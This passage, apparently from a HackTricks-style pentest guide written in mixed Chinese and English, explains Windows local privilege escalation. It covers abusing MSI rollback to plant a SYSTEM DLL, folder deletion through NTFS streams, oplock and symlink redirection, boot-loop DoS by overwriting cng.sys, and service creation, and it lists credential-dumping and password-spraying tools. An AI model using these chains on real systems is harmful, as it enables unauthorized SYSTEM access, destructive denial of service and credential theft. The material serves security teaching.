The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个 **malicious MSI installer**，用于占用 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将 rollback 文件存放到该文件夹，卸载过程中的 rollback 文件随后会被修改为包含恶意载荷。

技术摘要如下：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
该流存储该文件夹的**索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS **会从文件系统中移除整个文件夹**。

你可以使用标准文件删除 API 来执行此操作，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *file* delete API，它**删除 folder 本身**。

### 从 Folder Contents Delete 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意 files/folders，但它**确实允许删除 attacker-controlled folder 的 *contents***，怎么办？

1. 步骤 1：设置一个诱饵文件夹和文件
- 创建：`C:\temp\folder1`
- 在其中：`C:\temp\folder1\file1.txt`

2. 步骤 2：在 `file1.txt` 上放置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，oplock **会暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3：触发 SYSTEM 进程（例如 `SilentCleanup`）
- 该进程会扫描文件夹（例如 `%TEMP%`）并尝试删除其中的内容。
- 当它到达 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 步骤 4：在 oplock 回调内 – 重定向删除操作

- 选项 A：将 `file1.txt` 移到其他位置
- 这样会清空 `folder1`，而不会破坏 oplock。
- 不要直接删除 `file1.txt` — 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C: 在 `\RPC Control` 中创建一个 **symlink**:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS 内部流 — 删除它就会删除该文件夹。

5. 第5步: 释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**：`C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，允许你**以 SYSTEM/admin 身份创建任意文件夹** — 即使你**无法写入文件**或**设置弱权限**。

创建一个**文件夹**（不是文件），名称为**关键 Windows 驱动**，例如：
```
C:\Windows\System32\cng.sys
```
- 该路径通常对应于 `cng.sys` 内核模式驱动。
- 如果你**预先将其创建为一个文件夹**，Windows 在引导时会无法加载实际的驱动。
- 随后，Windows 在引导时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际的驱动**，并且**崩溃或停止引导**。
- 除非外部干预（例如，引导修复或磁盘访问），否则**没有回退**，也**无法恢复**。

### 从特权日志/备份路径 + OM symlinks 到 arbitrary file overwrite / boot DoS

当一个**特权服务**将日志/导出写入从**可写配置**读取的路径时，可以使用**Object Manager symlinks + NTFS mount points**重定向该路径，将该特权写入转为 arbitrary overwrite（即使**没有**SeCreateSymbolicLinkPrivilege）。

**Requirements**
- 存储目标路径的配置对攻击者可写（例如，`%ProgramData%\...\.ini`）。
- 能够创建指向 `\RPC Control` 的挂载点和一个 OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 有一个写入该路径的特权操作（日志、导出、报告）。

**Example chain**
1. 读取配置以恢复特权日志目标，例如在 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中的 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 在无需管理员权限的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，管理员触发 "send test SMS"）。写入现在落在 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（hex/PE parser）以确认损坏；重启会强制 Windows 从被篡改的驱动程序路径加载 → **boot loop DoS**。这也可以推广到任何特权服务会以写入方式打开的受保护文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果在 `C:\Windows\System32\cng.sys` 存在一个副本，系统可能会优先尝试加载它，从而使其成为对损坏数据的可靠 DoS 接收点。



## **从 High Integrity 到 System**

### **新服务**

如果你已经在 High Integrity 进程上运行，**到 SYSTEM 的路径** 可能很简单，只需**创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者 binary 能尽快执行必要的操作，因为如果它不是有效的 service，会在 20 秒内被终止。

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[关于所涉及注册表键以及如何安装 _.msi_ 包的更多信息，请见此处。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**在此找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 特权（通常会在已处于 High Integrity 的进程中发现），你将能够使用 SeDebug 权限 **打开几乎任何进程**（不是受保护的进程），**复制该进程的 token**，并用该 token **创建任意进程**。\
使用该技术时通常会 **选择一个以 SYSTEM 身份运行且具有所有 token 特权的进程**（_是的，你可能会发现一些 SYSTEM 进程并不具备所有 token 特权_）。\
**你可以在这里找到一个** [**执行该技术的示例代码**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

该技术被 meterpreter 用于在 `getsystem` 中提升权限。该方法包括 **创建一个 pipe，然后创建/滥用一个 service 将数据写入该 pipe**。随后，创建该 pipe 的 **server** 使用 **`SeImpersonate`** 权限将能够 **模拟 pipe 客户端（即 service）的 token**，从而获得 SYSTEM 权限。\
如果你想要 [**进一步了解 name pipes，请阅读此文**](#named-pipe-client-impersonation)。\
如果你想查看从 high integrity 到 System 使用 name pipes 的示例，请阅读 [**此处**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你设法 **劫持某个 dll** 被 **加载** 由以 **SYSTEM** 身份运行的 **process**，你就能够以该权限执行任意代码。因此 Dll Hijacking 对这类权限提升也很有用，而且从 high integrity 进程 实现起来要容易得多，因为它通常对用于加载 dll 的文件夹具有 **写权限**。\
**你可以** [**在此了解更多关于 Dll hijacking 的信息**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[静态 impacket 二进制](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**用于查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件（**[**在此查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测到。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息（**[**在此查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY, WinSCP, SuperPuTTY, FileZilla 和 RDP 的已保存会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭据。已检测到。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 将收集到的密码在域内进行密码喷洒**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows 权限提升 枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- 搜索已知的权限提升漏洞（已被 Watson 取代）~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的权限提升漏洞（需要使用 VisualStudio 编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更偏向信息收集工具而非权限提升）（需要编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭据（GitHub 上有预编译的 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- 检查错误配置（可执行文件在 GitHub 预编译）。不推荐。它在 Win10 上效果不好。~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（由 python 生成的 exe）。不推荐。它在 Win10 上效果不好。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于这篇文章创建的工具（不需要 accesschk 即可正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你需要使用正确版本的 .NET 编译该项目（[参见此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
